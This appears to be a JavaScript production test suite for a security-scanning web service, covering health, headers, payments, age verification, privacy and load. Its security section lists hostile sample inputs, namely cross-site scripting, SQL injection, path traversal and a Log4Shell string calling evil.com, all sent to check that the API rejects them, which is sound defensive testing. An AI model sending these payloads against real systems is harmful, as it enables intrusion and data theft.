// PQ359 Production Test Suite
// Comprehensive tests for production readiness

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import axios from 'axios';

const BASE_URL = process.env.VITE_API_URL || 'https://api.pq359.com';
const WEB_URL = process.env.VITE_WEB_URL || 'https://pq359.com';

describe('PQ359 Production Tests', () => {
  let authToken;

  beforeAll(async () => {
    // Setup test environment
    console.log('Setting up production tests...');
  });

  afterAll(async () => {
    // Cleanup
    console.log('Cleaning up production tests...');
  });

  describe('Health Checks', () => {
    it('should have healthy web application', async () => {
      const response = await axios.get(`${WEB_URL}/health`);
      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('status', 'healthy');
    });

    it('should have healthy API', async () => {
      const response = await axios.get(`${BASE_URL}/v1/health`);
      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('status', 'healthy');
    });

    it('should have neural network health endpoint', async () => {
      const response = await axios.get(`${BASE_URL}/v1/neural/health`);
      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('accuracy');
      expect(response.data.accuracy).toBeGreaterThan(0.95);
    });
  });

  describe('Security Headers', () => {
    it('should have proper security headers', async () => {
      const response = await axios.head(WEB_URL);
      
      expect(response.headers).toHaveProperty('x-frame-options');
      expect(response.headers).toHaveProperty('x-content-type-options');
      expect(response.headers).toHaveProperty('strict-transport-security');
      expect(response.headers['x-frame-options']).toBe('SAMEORIGIN');
      expect(response.headers['x-content-type-options']).toBe('nosniff');
    });

    it('should have CSP header', async () => {
      const response = await axios.head(WEB_URL);
      expect(response.headers).toHaveProperty('content-security-policy');
    });
  });

  describe('Performance Tests', () => {
    it('should respond within acceptable time limits', async () => {
      const start = Date.now();
      await axios.get(WEB_URL);
      const duration = Date.now() - start;
      
      expect(duration).toBeLessThan(2000); // 2 seconds max
    });

    it('should handle concurrent requests', async () => {
      const requests = Array(10).fill().map(() => axios.get(`${BASE_URL}/v1/health`));
      const responses = await Promise.all(requests);
      
      responses.forEach(response => {
        expect(response.status).toBe(200);
      });
    });
  });

  describe('API Functionality', () => {
    it('should handle user registration', async () => {
      const testUser = {
        email: `test-${Date.now()}@example.com`,
        password: 'TestPassword123!',
        age: 25
      };

      const response = await axios.post(`${BASE_URL}/v1/auth/register`, testUser);
      expect(response.status).toBe(201);
      expect(response.data).toHaveProperty('token');
      
      authToken = response.data.token;
    });

    it('should handle user authentication', async () => {
      const loginData = {
        email: 'test@example.com',
        password: 'TestPassword123!'
      };

      try {
        const response = await axios.post(`${BASE_URL}/v1/auth/login`, loginData);
        expect(response.status).toBe(200);
        expect(response.data).toHaveProperty('token');
      } catch (error) {
        // User might not exist, which is acceptable for production tests
        expect(error.response.status).toBe(401);
      }
    });

    it('should handle security scanning', async () => {
      const scanData = {
        url: 'https://example.com',
        type: 'quick'
      };

      const response = await axios.post(`${BASE_URL}/v1/scan`, scanData, {
        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {}
      });
      
      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('scanId');
    });
  });

  describe('Gamification Features', () => {
    it('should have working achievement system', async () => {
      if (!authToken) return; // Skip if no auth token

      const response = await axios.get(`${BASE_URL}/v1/achievements`, {
        headers: { Authorization: `Bearer ${authToken}` }
      });
      
      expect(response.status).toBe(200);
      expect(Array.isArray(response.data)).toBe(true);
    });

    it('should have working leaderboard', async () => {
      const response = await axios.get(`${BASE_URL}/v1/leaderboard`);
      expect(response.status).toBe(200);
      expect(Array.isArray(response.data)).toBe(true);
    });
  });

  describe('Neural Network Integration', () => {
    it('should have working threat detection', async () => {
      const threatData = {
        data: 'sample_network_traffic',
        type: 'network'
      };

      const response = await axios.post(`${BASE_URL}/v1/neural/detect`, threatData);
      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('threat_level');
      expect(response.data).toHaveProperty('confidence');
    });

    it('should have model performance metrics', async () => {
      const response = await axios.get(`${BASE_URL}/v1/neural/metrics`);
      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('accuracy');
      expect(response.data).toHaveProperty('latency');
      expect(response.data.accuracy).toBeGreaterThan(0.95);
      expect(response.data.latency).toBeLessThan(50); // 50ms max
    });
  });

  describe('Viral Growth Mechanics', () => {
    it('should have working referral system', async () => {
      if (!authToken) return;

      const response = await axios.get(`${BASE_URL}/v1/referral/code`, {
        headers: { Authorization: `Bearer ${authToken}` }
      });
      
      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('referralCode');
    });

    it('should track viral metrics', async () => {
      const response = await axios.get(`${BASE_URL}/v1/metrics/viral`);
      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('kFactor');
      expect(response.data).toHaveProperty('totalUsers');
    });
  });

  describe('Payment Integration', () => {
    it('should have working subscription endpoints', async () => {
      const response = await axios.get(`${BASE_URL}/v1/subscriptions/plans`);
      expect(response.status).toBe(200);
      expect(Array.isArray(response.data)).toBe(true);
      expect(response.data.length).toBeGreaterThan(0);
    });

    it('should handle payment intent creation', async () => {
      if (!authToken) return;

      const paymentData = {
        planId: 'premium',
        paymentMethod: 'card'
      };

      try {
        const response = await axios.post(`${BASE_URL}/v1/payments/intent`, paymentData, {
          headers: { Authorization: `Bearer ${authToken}` }
        });
        
        expect(response.status).toBe(200);
        expect(response.data).toHaveProperty('clientSecret');
      } catch (error) {
        // Payment might require additional setup
        expect([400, 402]).toContain(error.response.status);
      }
    });
  });

  describe('Family Protection', () => {
    it('should have age verification system', async () => {
      const ageData = { birthDate: '2010-01-01' }; // Minor
      
      const response = await axios.post(`${BASE_URL}/v1/age-verification`, ageData);
      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('isMinor', true);
      expect(response.data).toHaveProperty('parentalControlsRequired', true);
    });

    it('should have content filtering', async () => {
      const contentData = {
        content: 'sample content to filter',
        userAge: 12
      };

      const response = await axios.post(`${BASE_URL}/v1/content/filter`, contentData);
      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('filtered');
      expect(response.data).toHaveProperty('ageAppropriate');
    });
  });

  describe('Compliance & Privacy', () => {
    it('should have GDPR compliance endpoints', async () => {
      const response = await axios.get(`${BASE_URL}/v1/privacy/policy`);
      expect(response.status).toBe(200);
    });

    it('should handle data export requests', async () => {
      if (!authToken) return;

      const response = await axios.post(`${BASE_URL}/v1/privacy/export`, {}, {
        headers: { Authorization: `Bearer ${authToken}` }
      });
      
      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('exportId');
    });
  });

  describe('Monitoring & Analytics', () => {
    it('should have metrics endpoint', async () => {
      const response = await axios.get(`${BASE_URL}/v1/metrics/system`);
      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('uptime');
      expect(response.data).toHaveProperty('responseTime');
    });

    it('should track user engagement', async () => {
      const response = await axios.get(`${BASE_URL}/v1/analytics/engagement`);
      expect(response.status).toBe(200);
      expect(response.data).toHaveProperty('dailyActiveUsers');
      expect(response.data).toHaveProperty('sessionDuration');
    });
  });
});

// Load Testing Suite
describe('Load Testing', () => {
  it('should handle high concurrent load', async () => {
    const concurrentRequests = 50;
    const requests = Array(concurrentRequests).fill().map(async (_, index) => {
      const start = Date.now();
      const response = await axios.get(`${BASE_URL}/v1/health`);
      const duration = Date.now() - start;
      
      return { status: response.status, duration, index };
    });

    const results = await Promise.all(requests);
    
    // All requests should succeed
    results.forEach(result => {
      expect(result.status).toBe(200);
      expect(result.duration).toBeLessThan(5000); // 5 seconds max under load
    });

    // Average response time should be reasonable
    const avgDuration = results.reduce((sum, r) => sum + r.duration, 0) / results.length;
    expect(avgDuration).toBeLessThan(1000); // 1 second average
  });
});

// Security Testing Suite
describe('Security Testing', () => {
  it('should reject malicious payloads', async () => {
    const maliciousPayloads = [
      '<script>alert("xss")</script>',
      '"; DROP TABLE users; --',
      '../../../etc/passwd',
      '${jndi:ldap://evil.com/a}'
    ];

    for (const payload of maliciousPayloads) {
      try {
        await axios.post(`${BASE_URL}/v1/scan`, { url: payload });
      } catch (error) {
        expect(error.response.status).toBeGreaterThanOrEqual(400);
      }
    }
  });

  it('should have rate limiting', async () => {
    const requests = Array(100).fill().map(() => 
      axios.get(`${BASE_URL}/v1/health`).catch(e => e.response)
    );

    const responses = await Promise.all(requests);
    const rateLimited = responses.some(r => r.status === 429);
    
    // Should have some rate limiting in place
    expect(rateLimited).toBe(true);
  });
});
